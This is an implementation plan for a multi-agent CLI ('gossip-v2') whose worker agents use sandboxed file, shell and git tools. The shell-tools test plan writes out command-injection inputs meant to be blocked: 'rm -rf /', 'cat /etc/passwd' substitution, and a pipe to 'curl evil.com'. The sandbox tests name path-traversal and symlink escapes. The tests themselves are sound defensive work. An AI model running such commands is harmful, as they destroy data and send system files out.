# Gossip Mesh Phase 1 — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a working CLI where a developer talks to a main agent that dispatches tasks to worker agents via a relay, with those agents able to read/write files and run commands on the developer's machine.

**Architecture:** Fresh monorepo (`gossip-v2`) with npm workspaces. Five packages: `types` (shared protocol), `relay` (message routing server), `client` (agent WebSocket client), `tools` (local tool server for file/shell/git), `orchestrator` (main agent + worker dispatch). One app: `cli` (chat interface). All agents run in-process, communicate through a local relay via WebSocket. Main agent calls tools directly; workers request tools via relay messages.

**Tech Stack:** TypeScript 5.x, Node.js 22+, MessagePack (`@msgpack/msgpack`), WebSocket (`ws`), Jest, npm workspaces

**Source project:** `/Users/goku/claude/crab-language/` (port selectively, rename Crab→Gossip, fix known issues)

**Deferred from design doc (per eng review scope reduction):**
- `packages/consensus/` — ConsensusEngine deferred until agents actually disagree in practice
- TaskGraph with Supabase persistence — using in-memory task tracking for v1
- Approval queue (supervised/semi-auto/auto) — starting with auto-approve for dogfooding
- MCP bridge — add after native tools prove useful
- `runtime/` package — replaced by `orchestrator/` + `tools/` (simpler decomposition)
- Secret scanning, provider trust levels, E2E encryption — add when team/cloud mode needed

**Intentional divergence from design doc:** The relay server layer (`server.ts`) is rewritten from scratch rather than ported. This was an explicit eng review decision — the routing core (router, connection-manager, channels, etc.) is ported faithfully, but the 260-line god method in `relay.ts` is replaced with a clean <200 line WebSocket server.

---

## File Structure

```
gossip-v2/
├── package.json                          (workspace root)
├── tsconfig.base.json                    (shared TS config)
├── jest.config.base.js                   (shared Jest config)
├── packages/
│   ├── types/
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts                  (re-exports)
│   │       ├── protocol.ts              (MessageType, FieldNames, MessageEnvelope)
│   │       ├── codec.ts                 (Codec class — encode/decode MessagePack)
│   │       ├── message.ts              (Message factory class — createDirect, createChannel, etc.)
│   │       ├── tools.ts                (ToolDefinition, ToolCall, ToolResult)
│   │       └── errors.ts              (GossipError, GossipConnectionError, etc.)
│   │
│   ├── relay/
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts                (re-exports)
│   │       ├── server.ts              (WebSocket server — clean rewrite, <200 lines)
│   │       ├── agent-connection.ts    (ported from crab-language)
│   │       ├── connection-manager.ts  (ported + agentId secondary index)
│   │       ├── router.ts             (ported, crypto.randomUUID(), no Math.random())
│   │       ├── channels.ts           (ported, stripped CachedChannelManager)
│   │       ├── subscription-manager.ts (ported)
│   │       └── presence.ts           (ported)
│   │
│   ├── client/
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts               (re-exports)
│   │       └── gossip-agent.ts       (merged from both crab-language implementations — reconnection, backoff, keep-alive)
│   │
│   ├── tools/
│   │   ├── package.json
│   │   ├── tsconfig.json
│   │   └── src/
│   │       ├── index.ts              (re-exports)
│   │       ├── tool-server.ts        (listens for tool requests via relay, dispatches to handlers)
│   │       ├── file-tools.ts         (file_read, file_write, file_search, file_grep, file_tree)
│   │       ├── shell-tools.ts        (shell_exec with allowlist + timeout)
│   │       ├── git-tools.ts          (git_status, git_diff, git_log, git_commit, git_branch)
│   │       ├── sandbox.ts            (path validation, project root enforcement)
│   │       └── definitions.ts        (ToolDefinition arrays for each tool group)
│   │
│   └── orchestrator/
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           ├── index.ts              (re-exports)
│           ├── main-agent.ts         (conversational orchestrator — LLM-powered routing + synthesis)
│           ├── worker-agent.ts       (executes sub-tasks — LLM call + tool requests via relay)
│           ├── agent-registry.ts     (tracks agents, skills, availability, provider)
│           ├── task-dispatcher.ts    (decomposes tasks, assigns to workers, collects results)
│           ├── llm-client.ts         (multi-provider LLM abstraction — Anthropic, OpenAI, Gemini, local)
│           └── types.ts              (AgentConfig, TaskResult, DispatchPlan)
│
├── apps/
│   └── cli/
│       ├── package.json
│       ├── tsconfig.json
│       └── src/
│           ├── index.ts              (entry point — parse args, run setup or chat)
│           ├── chat.ts               (REPL loop — readline, display, streaming)
│           ├── setup-wizard.ts       (first-run: API keys, main agent, team config)
│           ├── config.ts             (load/save gossip.agents.yaml + validation)
│           └── keychain.ts           (OS keychain read/write for API keys)
│
├── tests/
│   ├── types/
│   │   ├── codec.test.ts
│   │   └── message.test.ts
│   ├── relay/
│   │   ├── server.test.ts
│   │   ├── connection-manager.test.ts
│   │   └── router.test.ts
│   ├── client/
│   │   └── gossip-agent.test.ts
│   ├── tools/
│   │   ├── file-tools.test.ts
│   │   ├── shell-tools.test.ts
│   │   ├── git-tools.test.ts
│   │   └── sandbox.test.ts
│   ├── orchestrator/
│   │   ├── main-agent.test.ts
│   │   ├── worker-agent.test.ts
│   │   ├── agent-registry.test.ts
│   │   └── task-dispatcher.test.ts
│   ├── cli/
│   │   ├── config.test.ts
│   │   └── keychain.test.ts
│   └── e2e/
│       └── full-flow.test.ts
│
└── gossip.agents.yaml.example          (example config)
```

---

## Task 1: Workspace Scaffolding

**Files:**
- Create: `package.json`, `tsconfig.base.json`, `jest.config.base.js`, `.gitignore`
- Create: `packages/types/package.json`, `packages/types/tsconfig.json`
- Create: `packages/relay/package.json`, `packages/relay/tsconfig.json`
- Create: `packages/client/package.json`, `packages/client/tsconfig.json`
- Create: `packages/tools/package.json`, `packages/tools/tsconfig.json`
- Create: `packages/orchestrator/package.json`, `packages/orchestrator/tsconfig.json`
- Create: `apps/cli/package.json`, `apps/cli/tsconfig.json`

- [ ] **Step 1: Create root package.json with npm workspaces**

```json
{
  "name": "gossip-v2",
  "version": "0.1.0",
  "private": true,
  "workspaces": [
    "packages/*",
    "apps/*"
  ],
  "scripts": {
    "build": "npm run build --workspaces",
    "test": "jest --config jest.config.base.js",
    "clean": "rm -rf packages/*/dist apps/*/dist"
  },
  "devDependencies": {
    "@types/jest": "^29.5.11",
    "@types/node": "^22.0.0",
    "jest": "^29.7.0",
    "ts-jest": "^29.1.1",
    "typescript": "^5.7.0"
  }
}
```

- [ ] **Step 2: Create tsconfig.base.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "lib": ["ES2022"],
    "declaration": true,
    "strict": true,
    "noImplicitAny": true,
    "strictNullChecks": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "sourceMap": true
  }
}
```

- [ ] **Step 3: Create jest.config.base.js**

```js
module.exports = {
  preset: 'ts-jest',
  testEnvironment: 'node',
  roots: ['<rootDir>/tests'],
  testMatch: ['**/*.test.ts'],
  moduleNameMapper: {
    '^@gossip/types$': '<rootDir>/packages/types/src',
    '^@gossip/relay$': '<rootDir>/packages/relay/src',
    '^@gossip/client$': '<rootDir>/packages/client/src',
    '^@gossip/tools$': '<rootDir>/packages/tools/src',
    '^@gossip/orchestrator$': '<rootDir>/packages/orchestrator/src'
  }
};
```

- [ ] **Step 4: Create .gitignore**

```
node_modules/
dist/
*.js.map
.env
.env.local
gossip.agents.yaml
coverage/
```

- [ ] **Step 5: Create each package's package.json and tsconfig.json**

Each package follows the same pattern. Example for `packages/types`:

```json
{
  "name": "@gossip/types",
  "version": "0.1.0",
  "main": "dist/index.js",
  "types": "dist/index.d.ts",
  "scripts": { "build": "tsc" },
  "dependencies": {
    "@msgpack/msgpack": "^3.0.0-beta2"
  }
}
```

tsconfig.json per package:
```json
{
  "extends": "../../tsconfig.base.json",
  "compilerOptions": {
    "outDir": "dist",
    "rootDir": "src"
  },
  "include": ["src"]
}
```

Workspace dependencies between packages:
- `@gossip/relay` depends on `@gossip/types`
- `@gossip/client` depends on `@gossip/types`
- `@gossip/tools` depends on `@gossip/types`, `@gossip/client`
- `@gossip/orchestrator` depends on `@gossip/types`, `@gossip/client`, `@gossip/tools`
- `apps/cli` depends on all packages

- [ ] **Step 6: Run npm install and verify workspace setup**

Run: `npm install`
Expected: All workspace packages linked, no errors.

- [ ] **Step 7: Commit**

```bash
git add -A
git commit -m "chore: scaffold gossip-v2 monorepo with npm workspaces

6 packages: types, relay, client, tools, orchestrator, cli
All use shared tsconfig and jest config."
```

---

## Task 2: @gossip/types — Shared Protocol Types + Codec

**Files:**
- Create: `packages/types/src/protocol.ts`, `packages/types/src/codec.ts`, `packages/types/src/message.ts`, `packages/types/src/tools.ts`, `packages/types/src/errors.ts`, `packages/types/src/index.ts`
- Test: `tests/types/codec.test.ts`, `tests/types/message.test.ts`

**Source:** Port from `/Users/goku/claude/crab-language/types/src/index.ts` and `/Users/goku/claude/crab-language/relay/src/protocol/codec.ts`. Rename Crab→Gossip. Replace `Math.random()` UUID with `crypto.randomUUID()`. Split into focused files.

- [ ] **Step 1: Write codec test (TDD — red)**

```typescript
// tests/types/codec.test.ts
import { Codec, MessageType, MessageEnvelope } from '@gossip/types';
import { randomUUID } from 'crypto';

describe('Codec', () => {
  const codec = new Codec();

  it('encodes and decodes a DIRECT message round-trip', () => {
    const envelope: MessageEnvelope = {
      v: 1, t: MessageType.DIRECT, f: 0,
      id: randomUUID(), sid: 'agent-a', rid: 'agent-b',
      ts: Date.now(), seq: 1, ttl: 300,
      body: new TextEncoder().encode('hello')
    };
    const encoded = codec.encode(envelope);
    expect(encoded).toBeInstanceOf(Uint8Array);
    expect(encoded.length).toBeGreaterThan(0);

    const decoded = codec.decode(encoded);
    expect(decoded.v).toBe(1);
    expect(decoded.t).toBe(MessageType.DIRECT);
    expect(decoded.sid).toBe('agent-a');
    expect(decoded.rid).toBe('agent-b');
    expect(new TextDecoder().decode(decoded.body)).toBe('hello');
  });

  it('preserves optional fields (rid_req, meta)', () => {
    const envelope: MessageEnvelope = {
      v: 1, t: MessageType.RPC_RESPONSE, f: 0,
      id: randomUUID(), sid: 'a', rid: 'b', rid_req: 'req-123',
      ts: Date.now(), seq: 0, ttl: 30,
      meta: { status: 'ok', code: 200 },
      body: new Uint8Array(0)
    };
    const decoded = codec.decode(codec.encode(envelope));
    expect(decoded.rid_req).toBe('req-123');
    expect(decoded.meta).toEqual({ status: 'ok', code: 200 });
  });

  it('rejects invalid version', () => {
    const bad = { v: 2, t: 1, f: 0, id: 'x', sid: 'a', rid: 'b', ts: 0, seq: 0, ttl: 0, body: new Uint8Array(0) };
    expect(() => codec.encode(bad as any)).toThrow('Invalid version');
  });

  it('rejects invalid message type', () => {
    const bad = { v: 1, t: 99, f: 0, id: 'x', sid: 'a', rid: 'b', ts: 0, seq: 0, ttl: 0, body: new Uint8Array(0) };
    expect(() => codec.encode(bad as any)).toThrow('Invalid message type');
  });

  it('uses crypto.randomUUID not Math.random', () => {
    // Verify Message.createDirect produces valid UUIDs
    const { Message } = require('@gossip/types');
    const msg = Message.createDirect('a', 'b', new Uint8Array(0));
    expect(msg.envelope.id).toMatch(/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx jest tests/types/codec.test.ts --no-coverage`
Expected: FAIL — module `@gossip/types` not found

- [ ] **Step 3: Implement protocol.ts, codec.ts, message.ts, tools.ts, errors.ts, index.ts**

Port from crab-language sources with these changes:
- `protocol.ts`: `MessageType`, `FieldNames`, `MessageEnvelope`, `PresenceStatus`, `ConnectionState` — rename nothing, these are protocol constants
- `codec.ts`: Port `Codec` class from `relay/src/protocol/codec.ts` — import types from `./protocol`
- `message.ts`: Port `Message` class. **CRITICAL FIX**: Replace `Math.random()` `generateMessageId()` with `crypto.randomUUID()`
- `tools.ts`: Port `ToolDefinition`, `ToolCall`, `ToolParameterProperty` from `runtime/src/tools/types.ts`. Add `ToolResult` interface:
  ```typescript
  export interface ToolResult {
    callId: string;
    name: string;
    output: string;
    error?: string;
  }
  ```
- `errors.ts`: Rename `CrabError` → `GossipError`, `CrabConnectionError` → `GossipConnectionError`, etc.
- `index.ts`: Re-export everything

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx jest tests/types/ --no-coverage`
Expected: All PASS

- [ ] **Step 5: Commit**

```bash
git add packages/types/ tests/types/
git commit -m "feat(types): shared protocol types, codec, and message factory

Ported from crab-language with fixes:
- crypto.randomUUID() replaces Math.random() (security fix)
- Renamed Crab→Gossip in error classes
- Added ToolDefinition, ToolCall, ToolResult types
- Split into focused files (<200 lines each)"
```

---

## Task 3: @gossip/relay — Message Routing Server

**Files:**
- Create: `packages/relay/src/server.ts`, `packages/relay/src/agent-connection.ts`, `packages/relay/src/connection-manager.ts`, `packages/relay/src/router.ts`, `packages/relay/src/channels.ts`, `packages/relay/src/subscription-manager.ts`, `packages/relay/src/presence.ts`, `packages/relay/src/index.ts`
- Test: `tests/relay/server.test.ts`, `tests/relay/connection-manager.test.ts`, `tests/relay/router.test.ts`

**Source:** Port routing core from `/Users/goku/claude/crab-language/relay/src/routing/`. Rewrite server layer (the 260-line god method becomes clean route handlers).

- [ ] **Step 1: Write connection-manager test (TDD)**

```typescript
// tests/relay/connection-manager.test.ts
import { ConnectionManager } from '@gossip/relay';

describe('ConnectionManager', () => {
  let cm: ConnectionManager;
  beforeEach(() => { cm = new ConnectionManager(); });

  it('registers and retrieves by session ID', () => {
    const conn = { agentId: 'agent-a', sessionId: 'sess-1' } as any;
    cm.register('sess-1', conn);
    expect(cm.get('sess-1')).toBe(conn);
  });

  it('retrieves by agent ID via secondary index (O(1))', () => {
    const conn = { agentId: 'agent-a', sessionId: 'sess-1' } as any;
    cm.register('sess-1', conn);
    expect(cm.getByAgentId('agent-a')).toBe(conn);
  });

  it('removes from both indexes on unregister', () => {
    const conn = { agentId: 'agent-a', sessionId: 'sess-1' } as any;
    cm.register('sess-1', conn);
    cm.unregister('sess-1');
    expect(cm.get('sess-1')).toBeUndefined();
    expect(cm.getByAgentId('agent-a')).toBeUndefined();
  });

  it('rejects duplicate session ID', () => {
    const conn = { agentId: 'agent-a', sessionId: 'sess-1' } as any;
    cm.register('sess-1', conn);
    expect(() => cm.register('sess-1', conn)).toThrow('already registered');
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx jest tests/relay/connection-manager.test.ts --no-coverage`
Expected: FAIL

- [ ] **Step 3: Port and fix connection-manager.ts**

Port from `/Users/goku/claude/crab-language/relay/src/routing/connection-manager.ts`. Add secondary `agentIdIndex: Map<string, AgentConnection>` — update in `register()` and `unregister()`. Change `getByAgentId()` from O(N) iteration to O(1) map lookup.

- [ ] **Step 4: Run test, verify pass**

Run: `npx jest tests/relay/connection-manager.test.ts --no-coverage`
Expected: PASS

- [ ] **Step 5: Port remaining routing components**

Port these files with minimal changes (rename imports to `@gossip/types`):
- `agent-connection.ts` — from `relay/src/routing/agent-connection.ts`
- `router.ts` — from `relay/src/routing/router.ts`. **FIX**: Replace `generateMessageId()` with `crypto.randomUUID()`. Replace `Array.shift()`+sort latency tracking with a circular buffer.
- `channels.ts` — from `relay/src/routing/channels.ts`. Strip `CachedChannelManager` (Supabase-specific). Keep in-memory `ChannelManager`.
- `subscription-manager.ts` — from `relay/src/routing/subscription-manager.ts`
- `presence.ts` — from `relay/src/routing/presence.ts`

- [ ] **Step 6: Write and implement server.ts (clean rewrite)**

New WebSocket server — NOT ported from relay.ts. Clean implementation:

```typescript
// packages/relay/src/server.ts — <200 lines
import { WebSocketServer, WebSocket } from 'ws';
import { createServer } from 'http';
import { Codec, MessageEnvelope } from '@gossip/types';
import { ConnectionManager } from './connection-manager';
import { MessageRouter } from './router';

export interface RelayServerConfig {
  port: number;
  host?: string;
}

export class RelayServer {
  private wss: WebSocketServer;
  private httpServer: ReturnType<typeof createServer>;
  private connectionManager: ConnectionManager;
  private router: MessageRouter;
  private codec = new Codec();

  constructor(private config: RelayServerConfig) {
    this.connectionManager = new ConnectionManager();
    this.router = new MessageRouter(this.connectionManager);
    this.httpServer = createServer(this.handleHttp.bind(this));
    this.wss = new WebSocketServer({ server: this.httpServer });
    this.wss.on('connection', this.handleConnection.bind(this));
  }

  async start(): Promise<void> { /* bind and listen */ }
  async stop(): Promise<void> { /* close all connections */ }
  private handleConnection(ws: WebSocket, req: any): void { /* auth, register, message loop */ }
  private handleHttp(req: any, res: any): void { /* health check only */ }
}
```

- [ ] **Step 7: Write server integration test**

```typescript
// tests/relay/server.test.ts
import { RelayServer } from '@gossip/relay';
import WebSocket from 'ws';
import { Codec, Message } from '@gossip/types';

describe('RelayServer', () => {
  let server: RelayServer;
  const codec = new Codec();

  beforeAll(async () => {
    server = new RelayServer({ port: 0 }); // random port
    await server.start();
  });
  afterAll(async () => { await server.stop(); });

  it('accepts WebSocket connections with agent ID', async () => {
    // connect, send auth, verify accepted
  });

  it('routes direct messages between agents', async () => {
    // connect agent-a and agent-b, send DIRECT from a→b, verify b receives
  });

  it('routes channel messages to subscribers', async () => {
    // connect agent-a and agent-b, both subscribe to 'test-channel',
    // agent-a publishes, verify agent-b receives
  });
});
```

- [ ] **Step 7b: Write router test**

```typescript
// tests/relay/router.test.ts
import { MessageRouter } from '@gossip/relay';
import { MessageType } from '@gossip/types';

describe('MessageRouter', () => {
  it('routes DIRECT message to correct agent', () => { /* ... */ });
  it('routes CHANNEL message to all subscribers', () => { /* ... */ });
  it('generates message IDs with crypto.randomUUID format', () => {
    // Verify no Math.random() UUIDs
  });
  it('returns error for unknown recipient', () => { /* ... */ });
});
```

- [ ] **Step 8: Run all relay tests, verify pass**

Run: `npx jest tests/relay/ --no-coverage`
Expected: All PASS

- [ ] **Step 9: Commit**

```bash
git add packages/relay/ tests/relay/
git commit -m "feat(relay): message routing server with clean WebSocket layer

Ported routing core from crab-language with fixes:
- O(1) agentId lookup via secondary index
- crypto.randomUUID() for message IDs
- Rewritten server layer (<200 lines, no god method)
- Stripped Supabase-specific CachedChannelManager"
```

---

## Task 4: @gossip/client — GossipAgent WebSocket Client

**Files:**
- Create: `packages/client/src/gossip-agent.ts`, `packages/client/src/index.ts`
- Test: `tests/client/gossip-agent.test.ts`

**Source:** Merge best of both implementations:
- `/Users/goku/claude/crab-language/client/src/crab-agent.ts` (published, clean API)
- `/Users/goku/claude/crab-language/dashboard/runtime/src/client/crab-agent.ts` (production, reconnection + backoff)

- [ ] **Step 1: Write GossipAgent test**

```typescript
// tests/client/gossip-agent.test.ts
import { GossipAgent } from '@gossip/client';
import { RelayServer } from '@gossip/relay';

describe('GossipAgent', () => {
  let server: RelayServer;
  beforeAll(async () => { server = new RelayServer({ port: 0 }); await server.start(); });
  afterAll(async () => { await server.stop(); });

  it('connects to relay and emits connect event', async () => {
    const agent = new GossipAgent({ agentId: 'test-a', relayUrl: server.url, apiKey: 'test' });
    const connected = new Promise(r => agent.on('connect', r));
    await agent.connect();
    await connected;
    expect(agent.isConnected()).toBe(true);
    await agent.disconnect();
  });

  it('sends and receives direct messages', async () => {
    const a = new GossipAgent({ agentId: 'a', relayUrl: server.url, apiKey: 'test' });
    const b = new GossipAgent({ agentId: 'b', relayUrl: server.url, apiKey: 'test' });
    await a.connect(); await b.connect();
    const received = new Promise(r => b.on('message', (data) => r(data)));
    await a.sendDirect('b', { hello: 'world' });
    expect(await received).toEqual({ hello: 'world' });
    await a.disconnect(); await b.disconnect();
  });

  it('reconnects with exponential backoff after disconnect', async () => {
    const agent = new GossipAgent({ agentId: 'test-r', relayUrl: server.url, apiKey: 'test' });
    await agent.connect();
    // Force disconnect server-side, verify agent reconnects
  });

  it('authenticates via initial frame, not URL query param', async () => {
    // Verify the WebSocket URL does NOT contain apiKey
    // Verify first message sent after open is an auth frame
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

- [ ] **Step 3: Implement GossipAgent**

Merged implementation with:
- Exponential backoff reconnection (from runtime version)
- Keep-alive ping/pong (from runtime version)
- Clean public API (from client version)
- Uses `@gossip/types` Codec for encoding (NOT direct msgpackEncode — fixes the encoding inconsistency)
- Auth via initial frame (NOT URL query param — fixes C-2 security issue)
- Event emitter for `message`, `connect`, `disconnect`, `error`

- [ ] **Step 4: Run test, verify pass**

- [ ] **Step 5: Integration test — GossipAgent + RelayServer**

Boot relay, connect two GossipAgents, exchange messages. Verify round-trip.

- [ ] **Step 6: Commit**

```bash
git add packages/client/ tests/client/
git commit -m "feat(client): GossipAgent with reconnection, backoff, and Codec encoding

Merged from both crab-language implementations:
- Exponential backoff reconnection
- Keep-alive ping/pong
- Auth via initial frame (not URL query param)
- Uses shared Codec class (not raw msgpackEncode)"
```

---

## Task 5: @gossip/tools — Local Tool Server

**Files:**
- Create: `packages/tools/src/tool-server.ts`, `packages/tools/src/file-tools.ts`, `packages/tools/src/shell-tools.ts`, `packages/tools/src/git-tools.ts`, `packages/tools/src/sandbox.ts`, `packages/tools/src/definitions.ts`, `packages/tools/src/index.ts`
- Test: `tests/tools/file-tools.test.ts`, `tests/tools/shell-tools.test.ts`, `tests/tools/git-tools.test.ts`, `tests/tools/sandbox.test.ts`

**This is all new code — written from scratch.** Security patterns referenced from crab-language but not ported.

- [ ] **Step 1: Write sandbox test (security-critical — test first)**

```typescript
// tests/tools/sandbox.test.ts
import { Sandbox } from '@gossip/tools';

describe('Sandbox', () => {
  const sandbox = new Sandbox('/tmp/test-project');

  it('allows paths within project root', () => {
    expect(sandbox.validatePath('/tmp/test-project/src/index.ts')).toBe(true);
  });

  it('blocks path traversal', () => {
    expect(() => sandbox.validatePath('/tmp/test-project/../../etc/passwd')).toThrow('outside project root');
  });

  it('blocks absolute paths outside root', () => {
    expect(() => sandbox.validatePath('/etc/passwd')).toThrow('outside project root');
  });

  it('allows file_write to non-existent path within root', () => {
    expect(sandbox.validatePath('/tmp/test-project/src/new-file.ts')).toBe(true);
  });

  it('blocks symlinks pointing outside project', () => {
    // Setup: fs.symlinkSync('/etc', '/tmp/test-project/escape-link')
    // Then: expect(() => sandbox.validatePath('/tmp/test-project/escape-link/passwd')).toThrow('outside project root');
    // Teardown: fs.unlinkSync('/tmp/test-project/escape-link')
  });
});
```

- [ ] **Step 2: Implement sandbox.ts**

```typescript
import { resolve, dirname } from 'path';
import { realpathSync, existsSync } from 'fs';

export class Sandbox {
  private root: string;

  constructor(projectRoot: string) {
    this.root = realpathSync(resolve(projectRoot));
  }

  /**
   * Validate that a path resolves within the project root.
   * Handles non-existent files (for file_write) by walking up to the
   * deepest existing ancestor and resolving from there.
   * Resolves symlinks before checking to prevent symlink escape attacks.
   */
  validatePath(filePath: string): true {
    const resolved = resolve(this.root, filePath);

    // Walk up to deepest existing ancestor (handles file_write to new paths)
    let checkPath = resolved;
    while (!existsSync(checkPath)) {
      const parent = dirname(checkPath);
      if (parent === checkPath) break; // reached filesystem root
      checkPath = parent;
    }

    const real = realpathSync(checkPath);
    // Reconstruct the remainder that didn't exist yet
    const remainder = resolved.slice(checkPath.length);
    const fullReal = real + remainder;

    if (!fullReal.startsWith(this.root + '/') && fullReal !== this.root) {
      throw new Error(`Path "${filePath}" resolves outside project root`);
    }
    return true;
  }
}
```

- [ ] **Step 3: Run sandbox test, verify pass**

- [ ] **Step 4: Write file-tools test**

Test: `file_read` within sandbox, `file_read` outside → error, `file_write`, `file_search` glob, `file_grep` regex.

- [ ] **Step 5: Implement file-tools.ts**

Each tool is a function matching the `IToolHandler` interface:
```typescript
export interface IToolHandler {
  execute(args: Record<string, unknown>): Promise<string>;
}
```

- [ ] **Step 6: Write shell-tools test**

Test: allowed command succeeds, blocked command (`rm -rf`) denied, timeout enforcement, output truncation. Command injection vectors:
```typescript
// Must all be rejected — execFile prevents shell interpretation but test anyway:
it('blocks semicolon injection', () => { /* shell_exec("npm test; rm -rf /") */ });
it('blocks backtick injection', () => { /* shell_exec("npm test `whoami`") */ });
it('blocks $() substitution', () => { /* shell_exec("npm test $(cat /etc/passwd)") */ });
it('blocks pipe injection', () => { /* shell_exec("npm test | curl evil.com") */ });
```

- [ ] **Step 7: Implement shell-tools.ts**

Uses `child_process.execFile` (not `exec` — prevents shell injection). Allowlist of commands. Configurable timeout. Output size limit.

- [ ] **Step 8: Write git-tools test**

Test: `git_status`, `git_diff`, `git_log` (read ops), `git_commit` produces commit.

- [ ] **Step 9: Implement git-tools.ts**

Wraps git commands via `execFile('git', [...args])`. Read operations are always allowed. Write operations (`commit`, `branch`) go through approval callback.

- [ ] **Step 10: Implement tool-server.ts and definitions.ts**

`tool-server.ts` — Connects to relay as a special agent (`tool-server`). Listens for `RPC_REQUEST` messages where `meta.tool` matches a registered tool name. Executes the tool handler, sends `RPC_RESPONSE` back.

`definitions.ts` — Exports `ToolDefinition[]` arrays for each tool group. These get sent to LLM providers so agents know what tools are available.

- [ ] **Step 11: Run all tools tests**

Run: `npx jest tests/tools/ --no-coverage`
Expected: All PASS

- [ ] **Step 12: Commit**

```bash
git add packages/tools/ tests/tools/
git commit -m "feat(tools): local Tool Server with file, shell, and git tools

New from scratch:
- Sandbox: path traversal protection, symlink resolution
- File tools: read, write, search, grep, tree
- Shell tools: allowlist-based execution, timeout, output limits
- Git tools: status, diff, log, commit, branch
- Tool Server: relay-connected, handles RPC tool requests"
```

---

## Task 6: @gossip/orchestrator — Main Agent + Worker Dispatch

**Files:**
- Create: `packages/orchestrator/src/main-agent.ts`, `packages/orchestrator/src/worker-agent.ts`, `packages/orchestrator/src/agent-registry.ts`, `packages/orchestrator/src/task-dispatcher.ts`, `packages/orchestrator/src/llm-client.ts`, `packages/orchestrator/src/types.ts`, `packages/orchestrator/src/index.ts`
- Test: `tests/orchestrator/agent-registry.test.ts`, `tests/orchestrator/task-dispatcher.test.ts`, `tests/orchestrator/worker-agent.test.ts`, `tests/orchestrator/main-agent.test.ts`

**All new code.** LLM client abstraction referenced from crab-language runtime but rewritten clean.

- [ ] **Step 1: Write agent-registry test**

```typescript
// tests/orchestrator/agent-registry.test.ts
import { AgentRegistry } from '@gossip/orchestrator';

describe('AgentRegistry', () => {
  it('registers agent with skills and finds best match', () => {
    const registry = new AgentRegistry();
    registry.register({
      id: 'claude-arch', provider: 'anthropic', model: 'claude-sonnet-4-6',
      preset: 'architect', skills: ['typescript', 'system_design', 'code_review']
    });
    registry.register({
      id: 'gpt-impl', provider: 'openai', model: 'gpt-5',
      preset: 'implementer', skills: ['typescript', 'react', 'implementation']
    });

    const match = registry.findBestMatch(['typescript', 'implementation']);
    expect(match?.id).toBe('gpt-impl'); // 2 skill overlap vs 1
  });

  it('returns null when no agents registered', () => {
    const registry = new AgentRegistry();
    expect(registry.findBestMatch(['typescript'])).toBeNull();
  });
});
```

- [ ] **Step 2: Implement agent-registry.ts**

Simple skill overlap scoring. No fancy algorithms — just count matching skills between required and available.

- [ ] **Step 3: Write task-dispatcher test**

Test: single task → assigns to best agent. Multiple independent tasks → parallel dispatch. Task with no matching agent → fallback.

- [ ] **Step 4: Implement task-dispatcher.ts**

Receives a high-level task description, calls the main agent's LLM to decompose into sub-tasks (each with required skills), assigns via AgentRegistry, tracks completion.

- [ ] **Step 5: Write llm-client test (mocked providers)**

Test: Anthropic, OpenAI, and Gemini message format conversion. Tool call parsing. Error handling (timeout, rate limit).

- [ ] **Step 6: Implement llm-client.ts**

Multi-provider LLM abstraction. One interface, three implementations. Port patterns from crab-language `dashboard/runtime/src/llm/` but rewrite clean:
```typescript
export interface ILLMProvider {
  generate(messages: LLMMessage[], tools?: ToolDefinition[]): Promise<LLMResponse>;
}
```

Providers: `AnthropicProvider`, `OpenAIProvider`, `GeminiProvider`, `OllamaProvider` (local).

- [ ] **Step 7: Implement worker-agent.ts**

A worker agent: receives a sub-task (description + context), calls its LLM, requests tools via relay (RPC to Tool Server), returns result. Runs as an async task in the CLI process.

- [ ] **Step 8: Implement main-agent.ts**

The main agent (orchestrator): receives developer messages, decides to handle alone or dispatch, manages task-dispatcher, synthesizes results, responds conversationally. Uses the decision tree from the design doc.

- [ ] **Step 9: Run all orchestrator tests**

Run: `npx jest tests/orchestrator/ --no-coverage`
Expected: All PASS

- [ ] **Step 10: Commit**

```bash
git add packages/orchestrator/ tests/orchestrator/
git commit -m "feat(orchestrator): main agent, worker dispatch, and multi-LLM client

- Main agent: conversational orchestrator with smart routing heuristics
- Worker agent: LLM + tool execution via relay RPC
- Agent registry: skill-based matching for task assignment
- Task dispatcher: decomposes and assigns sub-tasks
- LLM client: Anthropic, OpenAI, Gemini, Ollama providers"
```

---

## Task 7: CLI Chat Interface + Config

**Files:**
- Create: `apps/cli/src/index.ts`, `apps/cli/src/chat.ts`, `apps/cli/src/setup-wizard.ts`, `apps/cli/src/config.ts`, `apps/cli/src/keychain.ts`
- Create: `gossip.agents.yaml.example`

- [ ] **Step 1: Implement config.ts**

Load and validate `gossip.agents.yaml`. Fail fast with clear messages on missing/invalid fields. Schema:

```yaml
main_agent:
  provider: anthropic
  model: claude-sonnet-4-6

agents:
  claude-arch:
    provider: anthropic
    model: claude-opus-4-6
    preset: architect
    skills: [typescript, system_design]
```

- [ ] **Step 2: Implement keychain.ts**

OS keychain integration. macOS: `security` CLI. Linux: `secret-tool`. Fallback: prompt in terminal with warning.

Handle the critical gap: keychain permission denied → fallback to terminal prompt with warning "Keys stored in memory only, not persisted."

- [ ] **Step 3: Implement setup-wizard.ts**

First-run wizard: detect providers (check for Ollama on localhost), prompt for API keys, select main agent model, choose preset team. Save to `gossip.agents.yaml` and keychain.

- [ ] **Step 4: Implement chat.ts**

REPL loop using Node.js `readline`. Display streaming responses. Show progress for multi-agent tasks. Handle Ctrl+C gracefully.

- [ ] **Step 5: Implement index.ts (entry point)**

```typescript
#!/usr/bin/env node
// Parse args: gossip, gossip "one-shot task", gossip setup
// If no config → run setup wizard
